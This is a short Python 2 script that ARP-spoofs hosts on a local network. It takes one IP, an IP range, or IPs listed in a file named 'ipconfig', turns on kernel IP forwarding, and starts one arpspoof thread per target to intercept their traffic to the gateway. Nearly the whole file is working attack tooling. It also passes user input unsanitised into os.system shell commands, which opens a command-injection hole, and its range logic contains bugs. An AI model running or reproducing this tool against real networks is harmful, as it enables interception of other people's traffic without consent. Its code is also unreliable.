import os,time,thread
from pathlib import Path
list=[]
ip=0
choice=int(input("Enter your choice\n1.Add Single Address\n2.Add IP Range\n3.Add from File"))
gateway=str(raw_input("Enter the Router IP Address[Gateway address]"))
interface=raw_input("Enter the Interface for Operating : ")
def spoof(ip,inter,gateway):
	result=os.system("arpspoof -i "+inter +" -t "+ip+" "+gateway+"")
def isIP(ip):
	try:
		ip=ip.split(".")
		ip1=int(ip[0])
		ip2=int(ip[1])
		ip3=int(ip[2])
		ip4=int(ip[3])
		if(ip1 > 255 or ip2 > 255 or ip3 >255 or ip4 >255):
			return False
		else:
			return True
	except:
		return False

os.system("echo 1 >> /proc/sys/net/ipv4/ip_forward")
if(choice == 1):
	ip=str(raw_input("Enter the IP address"));
   	thread.start_new_thread(spoof,(ip,interface,gateway))

if(choice == 2):
	fromip=str(raw_input("Enter the from IP"))
	toip=str(raw_input("Enter the to IP"))
	fromip=fromip.split(".")
	toip=toip.split(".");
	fromip1=int(fromip[0])
	fromip2=int(fromip[1])
	fromip3=int(fromip[2])
	fromip4=int(fromip[3])
	toip1=int(toip[0])
	toip2=int(toip[1])
	toip3=int(toip[2])
	toip4=int(toip[3])
	if((fromip1 >255 or fromip2 > 255 or fromip3 >255 or fromip4 > 255) and (toip1 > 255 or toip2 > 255 or toip3 >255 or toip4 > 255)):
		print("Enter Valid IP Address !!")
	else:
		ipcal1=toip1-fromip1
		ipcal2=toip2-fromip2
		ipcal3=toip3-fromip3
		ipcal4=toip4-fromip4
	
		hostcount=ipcal4+(ipcal3*255)+(ipcal2*65025)
	
		if(ipcal4 < 0):     
			ipcal3=ipcal3-1     
			ipcal4=ipcal4+255 
		if(ipcal3 <0):    
			ipcal2=ipcal2-1     
			ipcal3=ipcal3+255 
		if(ipcal2 < 0):
			ipcal1=ipcal1-1     
			ipcal2=ipcal2+255 
		for count in range(0,hostcount):	

			if(fromip4 > 255):
				fromip4=0
				fromip3=fromip3+1
			if(fromip3 > 255):
				fromip3=0
				fromip2=fromip2+1
			if(fromip2 > 255):
				fromip2=0
				fromip1=fromip+1
			currentip=str(fromip1)+"."+str(fromip2)+"."+str(fromip3)+"."+str(fromip4)
			print("IP   :   "+currentip)
   			thread.start_new_thread(spoof,(currentip,interface,gateway))
   			fromip4=fromip4+1
if(choice == 3):
	my_file = Path("ipconfig")
	if my_file.is_file():
		with open("ipconfig","r") as file:
			for line in file:
				ip=line.replace("\n","")
				if(isIP(ip)):
					print("IP : "+ip)
   					thread.start_new_thread(spoof,(ip,interface,gateway))
   	else:
		print "File not Exists \nCreate a file in the name of 'ipconfig'"

while 1:
   pass
